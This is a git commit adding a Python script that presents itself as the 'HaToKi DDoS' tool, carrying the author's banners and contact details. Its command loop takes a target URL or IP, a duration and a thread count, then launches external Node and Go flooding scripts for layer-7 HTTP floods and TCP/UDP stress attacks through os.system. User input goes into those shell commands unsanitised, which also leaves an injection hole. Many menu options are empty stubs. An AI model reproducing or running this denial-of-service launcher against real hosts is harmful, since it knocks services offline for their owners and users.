a182537626edfb59b197d3a2bed1e56544df9bae
tdd2006 <109543062+tdd2006@users.noreply.github.com>
2022-08-29 14:18:28 +0700

    Create hatoki.py

---
+++ hatoki.py
@@ -0,0 +1,161 @@
+from colorama import Fore, Back, Style
+import socket
+import os
+import requests
+import random
+import getpass
+import time
+import sys
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+proxys = open('proxies.txt').readlines()
+bots = len(proxys)
+
+def ascii_vro():
+    clear()
+    print(Fore.BLUE + """
+     ██░ ██  ▄▄▄     ▄▄▄█████▓ ▒█████   ██ ▄█▀ ██▓
+    ▓██░ ██▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒ ▓██▒
+    ▒██▀▀██░▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓███▄░ ▒██▒
+    ░▓█ ░██ ░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▓██ █▄ ░██░
+    ░▓█▒░██▓ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░▒██▒ █▄░██░
+     ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▓  
+     ▒ ░▒░ ░  ▒   ▒▒ ░   ░      ░ ▒ ▒░ ░ ░▒ ▒░ ▒ ░
+     ░  ░░ ░  ░   ▒    ░      ░ ░ ░ ▒  ░ ░░ ░  ▒ ░
+     ░  ░  ░      ░  ░            ░ ░  ░  ░    ░   by HoTieuBao
+                                           """)
+    time.sleep(1.8)
+    clear()
+
+def si():
+    print("Zalo/Call: 0974998164")
+    print("Information: https://duydevcoder.info")
+
+def menu():
+    sys.stdout.write(f"HaToKi Ddos Update 4.1.1")
+    clear()
+    print('HaToKi DDoS By TranDucDuy [duydevcoder.info] ')
+    print("https://duydevcoder .info")
+    print(Fore.YELLOW + """
+
+            ╚═════════════════════╦═════════════════════════════════════════╦══════════════════════╝
+                ╔═════════════════╩══════════════[HaToKi-DDoS]══════════════╩══════════════════╗
+               ╔╝------------------------------------------------------------------------------╚╗
+               ║   db   db  .d8b.  d888888b  .d88b.  db   dD d888888b      db    db .d888b.     ║
+               ║   88   88 d8' `8b `~~88~~' .8P  Y8. 88 ,8P'   `88'        88    88 VP  `8D     ║
+               ║   88ooo88 88ooo88    88    88    88 88,8P      88         Y8    8P    odD'     ║
+               ║   88~~~88 88~~~88    88    88    88 88`8b      88         `8b  d8'  .88'       ║
+               ║   88   88 88   88    88    `8b  d8' 88 `88.   .88.         `8bd8'  j88.        ║
+               ║   YP   YP YP   YP    YP     `Y88P'  YP   YD Y888888P         YP    888888D     ║
+               ║------------ Link faceBook : https://www.facebook.com/TranDucDuy.Dev -----------║
+               ╚════════════════════════╦═══════════════════════════╦═══════════════════════════╝
+                     ╔══════════════════╩═══════════════════════════╩═══════════════════╗
+                     ║-------------- Vui Long Khong Tan Cong Gov,Edu Xin Cam On Ban. ---------------║ 
+                     ╚═════════════╦══════════════════════════════════════╦═════════════╝
+                         ╔═════════╩═════════╗                  ╔═════════╩═════════╗
+                         ║   duydevcoder.info  ╠══════════════════╣   duydevcoder.info  ║
+                         ║    0974998164     ║ -   -   -   -  - ║     0974998164    ║
+                         ║                   ╠══════════════════╣                   ║
+                         ╚═══════════════════╝                  ╚═══════════════════╝
+
+""")
+
+def main():
+    menu()
+    while(True):
+        cnc = input('''Input :''')
+        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
+            ()
+        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
+            ()
+        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
+            ()
+        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
+            ()
+        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
+            ()
+        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
+            ()
+        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
+            ()
+        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
+            ()
+        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
+            ()
+
+        elif "http-socket" in cnc:
+            try:
+                url = cnc.split()[1]
+                per = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'node HTTP-SOCKET {url} {per} {time}')
+            except IndexError:
+                print(Fore.RED +'Usage: http-socket <url> <per> <time>')
+                print(Fore.RED +'Example: http-socket http://duydevcoder.info/ 5000 60')
+
+        elif "http-raw" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node HTTP-RAW {url} {time}')
+            except IndexError:
+                print(Fore.RED +'Usage: http-raw <url> <time>')
+                print(Fore.RED +'Example: http-raw http://duydevcoder.info/ 60')
+
+        elif "http-requests" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node HTTP-REQUESTS {url} {time}')
+            except IndexError:
+                print(Fore.RED +'Usage: http-requests <url> <time>')
+                print(Fore.RED +'Example: http-requests http://duydevcoder.info/ 60')
+
+        elif "stress" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                mode = cnc.split()[3]
+                conn = cnc.split()[4]
+                time = cnc.split()[5]
+                out = cnc.split()[6]
+                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
+            except IndexError:
+                print(Fore.RED +'Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
+                print(Fore.RED +'MODE: [1] TCP')
+                print(Fore.RED +'      [2] UDP')
+                print(Fore.RED +'      [3] HTTP')
+                print(Fore.RED +'Example: stress 1.1.1.1 80/443 3 1250 60 5')
+
+        elif "http-rand" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node HTTP-RAND.js {url} {time}')
+            except IndexError:
+                print(Fore.RED +'Usage: http-rand <url> <time>')
+                print(Fore.RED +'Example: http-rand http://duydevcoder.info/ 60')
+
+        elif "sever" in cnc:
+            try:
+                url = cnc.split()[1]
+                method = cnc.split()[2]
+                os.system(f'go run sever.go -site {url} -data {method}')
+            except IndexError:
+                print(Fore.RED +'Usage: sever <url> METHODS<GET/POST>')
+                print(Fore.RED +'Example: sever http://duydevcoder.info/ GET')
+
+        elif "info" in cnc:
+            print(f'''
+[https://hotieubao.info]
+
+            ''')
+        else:
+            try:
+                cmmnd = cnc.split()[0]
+                print("Command: [ " + cmmnd + " ] Co Cai Lon!")
+            except IndexError:
+                pass
+main()
